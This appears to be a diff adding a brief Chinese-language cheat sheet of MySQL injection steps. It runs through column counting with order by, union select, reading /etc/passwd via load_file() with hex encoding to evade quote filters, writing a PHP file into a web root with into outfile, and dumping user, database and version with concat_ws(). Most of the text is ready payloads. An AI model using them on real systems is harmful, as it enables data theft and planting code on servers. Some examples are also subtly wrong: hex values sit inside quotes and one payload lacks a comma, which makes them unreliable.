@@ -1,0 +1,19 @@
+MySQL的注入过程
+
+一，order by查询字段
+
+二，union select
+
+三，load_file()函数读取文件（load_file()函数读取文件，用户必须要file权限，文件必须再服服器上，读文件的绝对路径，文件的容量必须小于max_allowed_packet字节）
+
+例如：union select 1,load_file('/etc/passwd'),2,3,4，通常一些防注入的语句不允许单引号出现，用union select 1 load_file('0x2f6574632f706173737764'),0x2f6574632f706173737764为/etc/passwd的十六进制结果。
+
+四，into outfile 写文件
+
+select '<?php phpinfo();?>' into outfile 'c:\wwwroot\1.php'
+
+select '0x537472696e6720746f20757365' into outfile 'c:\wwwroot\1.php'
+
+五，连接字符踹
+
+concat_ws()函数，select name from students where id=1 union select concat_ws(0x2c,user(),database(),version())
